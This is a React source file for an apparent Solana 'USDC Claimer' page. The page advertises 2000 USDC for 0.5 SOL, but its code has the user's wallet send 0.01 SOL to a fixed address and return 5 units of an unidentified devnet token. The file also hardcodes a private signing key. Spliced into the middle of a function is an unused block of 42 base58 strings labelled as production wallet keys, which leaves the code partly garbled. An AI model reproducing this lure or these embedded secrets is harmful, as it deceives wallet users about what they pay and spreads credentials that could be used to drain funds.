/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "3woEVTCPUFvqbDwLpzzCsru73nbQNG5ib4Q74xQ7EmckJpPAdWCthjaPJMXWU1hUhTBB32iPRYfHjwGnf5Y6oS5f"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "4pQMUzTCsZBKBuLY1nAePz99MCAVcsZb2VXuVtqK8Quayo9R3wF8uruLpzrFZeQdeMgRoonDHZGX2qZhn864mNSt",
  "key1": "2YRhkpMGMaJVRdqicrwmV3a75WutrtP539XZisdjGJhnkeN7tZpRqmFC6cy8BgZhN76G51t4fgYdGLtLXCJ2pbob",
  "key2": "4qmrSpku6KFb6bk2fACs3fgHGsZFyJggva969EyBthcMheeLq4U9n5LWpinZHkmZ5b7rCxeLKKoWm8WqSJrvMBqK",
  "key3": "5LJNAi1XvKvr1uaULnembEygghdyRogTqoEJwXR5cCoLiLEyzdudXtBr5rrfSi7yfZ5eWy7VT3yPisGxLrjd7Xuc",
  "key4": "4XzsHkKacQat5EvhJ78eJbuYjozJYEavtFEieL1H71LizLfT5ECfjQC1JrwwkQZX6TsTS6RaTSba4Yh6Vw6e8enz",
  "key5": "29kKQnh64Jp92c9UgW5Wj4PpN2PAXmdzQkWjZGwsZkKE5YLx7TvBhJRNagewjzn6VvP5wAruVjCHnu5rvdj8qDrg",
  "key6": "5RBkop2vyaGJZGRW3rv9NNhbupPjbVdher1AypP1ACe5DtYMnj7mmATZERbVd26tD5WKbDeBL1AC1TRFvMLmyWm6",
  "key7": "9TYAXevrS72Kw8BnTmvJWacW91iDvjiX1deQTJYejDfpkPxecQj1YtfzZqZXi1c67vjr36WdTw4H5wybNxx2P7V",
  "key8": "62tEGHtvRnpPCPbj5cgWbZ4RdanXsWQujo4mMUDDCtCX74QWyo3w1P64kWT9LL7bun37K3WP9HHHTXm5L9VuGNov",
  "key9": "5iFnQHoa5nLVhW5QbeHdARMQBvT3wcRfEFMBUQqRoVjFCCAC3smg8zxMnHziDzv53Skf9izrAxmQd3VZGCnGkgDJ",
  "key10": "3WREPRToLTDnNbXZhrTxyaFeCUwDXhkXt4TzjKnxbNXU9RqA4cXsYuYKDnbdY9x5r2h3w6zcDaVT8FMoesMKW1Ry",
  "key11": "3eF4JmD5EY9wjVNYQ1W7AY9R8si8LJxPxdtRCczAUCqZ7YgPMixkvnPuSyU4QDRxo5MaX4Wzr1huJ2nRJKvKyLKL",
  "key12": "3vtt6FXQCYvzhZN7Aht7HvE5TJwny51Gr5udM7JSpxBY3YvRNDNE3HvFiEpe7yhDw1SZjHq1tkxTaX8wtKJ6ttvz",
  "key13": "3x3kprWQg7JVFJPVeJ6bVzrxSturHqXkHWkbd1CMKfE3qbruPpsYe5wkF1WRJRguHzmD9w9XZ9CSaWbUkvYN62F8",
  "key14": "2L1jf7DFYG1tkm7tSnp1AJNDMWWFoDixNJmjparY2bfdpdjqrXVBpMzvcmKCtB2KAEtWg76oqtYXShccdoCUeU1i",
  "key15": "52rmxJBxiYswqaCaQEk2zC3qg9Y7XPkv8W5Y5XkKVeYqHStR3jiBJJgv6kZiP8sxCKTUELYpXokfCi9K9NigrLkq",
  "key16": "4YFCg65GVaDNHiZ5wtqwMekZdFTRn3vJPVFwQXCEAbgN5x41Fy4mr7npXAQY219bhUZjprKZj27o9YYFVDRNDd9n",
  "key17": "trFpF1v5FgXYvMmsv1CE2mgbNXRRPSgiHTCys2GDWUc66YNyVUEqfNauw2TyuXWK5FdgCgHqjtg4D3yRTYkNYXS",
  "key18": "4rDMGfyU188AM7stBnSZBQfUAH24NpWRs9o8LkLFjiHYFHKHrTMeTZyfuCD8A9XttVEC4b1Zpi9qAQApLGrbPmnm",
  "key19": "2bwBtfcbAH98ftfeYbP4qhJVpgucyhX1AhXkxxSn5h1c4RS7owcvV8SumTcgJbzAYNJsCSJo89eZnEPtV14pmDbf",
  "key20": "2NqG62tuyLE1uDzBHGuMhdtBnsWipjmv2AjUUzyhKpyTtseHdHN6HogUcr1fqK6oYi7ufVUAmCeJHy5cTvueBRMv",
  "key21": "F26aNTvymtVbrBjsvBfHtSoFB8rHT6cPUYBXQAAjeGQkz3VvuyvR1U9y6DaBAbyC9WZbCqmH3KnnC3LA37txAxm",
  "key22": "3H54GjPNpHZf1up6dMW3kpbBbHgSLaDcJeYRoa8FhVqs5N5CBTjRfM5tjsRYFDZjWECRbgkzZC1kNcsgxupuRnPq",
  "key23": "3yiwzyHBR7njmeB252Z3F2HnSF29UuXqRjaoC7FnmZKqJqQngY6F7fY61ecay6Ciw52M1qhmJ5TTFhDo1kvc82W8",
  "key24": "2MwGWestpjFGUrvBEphHaaYTNHSTzFXWVok7GnbJC6kQJMdUkzd8y3DYRcCkZpC7TQASMiFXn9pQv38VLQC4yLaJ",
  "key25": "4tKE5zcui3RZ8JBnFC6i4P3CmzcPkrGN864v5j2RgoQXjAtR2Hio2JaWbh1i8hNwdZpANfJvcj94chWt5t1zecZ6",
  "key26": "43STsDBp51DzVsAFKCvJXgHWxhTYGNXG5wqg48vuQGmeEUrmzSsc2jaY5fUxEmaHyY16fBHLPXf4ai6Bq6HNPcpo",
  "key27": "azoYnup2GgD5CysTGrWMpCVrH4kr5xXU2gA221JX3hJbyufzEkXCBa1dVGV3hJyw6gcKQXaDyn1R7iDMrXvbB52",
  "key28": "2Z7f7BjXjBpZgeca5i4J4MuXmZ35zLyARqEHFhRXZNgXEhqWunuoWZdH6eiGQ9aydtgd63TCNL6ZCnW1aejmKpXd",
  "key29": "29Rk49xPoSrAkxg5STwmjx37vcuaDkhU6iwmXVkzCtp6ckzXH6e69n3zhofiMYckZqypJNyB9Z4gmfmyaYdmbNaL",
  "key30": "5F1R5rHhVCWmYrtGveGm6T6MbtxyzX21GAa3raYMDrkQcrGswKFNjYK5Ec41ubEUwvLFjwL5X3rBjwMX3k1JWaYv",
  "key31": "31vBRQTYmErkA8xZyJc8TaCGQW7n6cNY6B5q7LG2Nj1Kdhjwhuq1mge2LhARgqeGmG7fXxTohPBQBAdMhwy7tHEU",
  "key32": "3jjUTnppLpwNSBQq99fnavpc2anvg1ssmRvBaSUbXW56ubBX2xAxGUDT1uwbQzfK6VDiBfzX7U9834YPCu7tLygr",
  "key33": "2sHrfMPNdcejM3E9BNdxswnPyayDLQMc6nRJTHER5mWUU8w6N6Fu7ouAQfru7CKmJcJ3wuxsRUYybo17yGFGDVzG",
  "key34": "3dJ4YhwnxZyDpA4upC5rZTJzFes8ZzwQRLdiprKMrCVmFYYPXnvfW6VBYXaAkmuyrbATkgmBb7tgoXpvSbghvm5B",
  "key35": "5y4E34yiAv1iCWX8cpf7hRfgC6cyuffVNLoEzGJSvANLHw3B2mMkKNoc4yaoWURQVdE5vfRXFsVbhu4UX3aQbb49",
  "key36": "aQgkFDg4TvLigytP5x9xzSD7RFZjEzYdHfMaby9Gv7uAN1HKvpGzNxzqdfgsC3mz9nTdM9qeauHUEGTAMPhd18Q",
  "key37": "unnQePn8K3Wq7EEg3o7KwKWCpqYxDZetj1eUeVJhvw153cRRiqH2RWLDaqmig1kb6CH1R8dUPa3Y6pFCfHsz1AR",
  "key38": "5DQA6EWUoHkLYDLSx75rjNEVWc2ayyAMqtREZ79gUdXG7YqCtg9kns3buWP8YFcp9BaEgNEynpnrArezkdCSMitK",
  "key39": "TMjGjq6WxmmpwVv7VV6zsUyTQzgoapjvKnAbsVZbUPsxe76A1U2D3Gg2KyCkGYAuWC8nd9qxmXGLG2yGXbZ7JBj",
  "key40": "3MgSzTsQWEKRrejMPtqMviJDJ9iSCio2C2KTfrtSd6wrUFJAdfMRgYZVmeaSqbMB34ELhrGJGaUgurp7bsksth23",
  "key41": "32vocsBVPe7bEb3bceL3U3cKZU9biQo8RfKBw4bR2gQRcs23hieo8S1AnxW7HM3UUcd8F3ZUXxhsLvzjYgx6qa8E"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
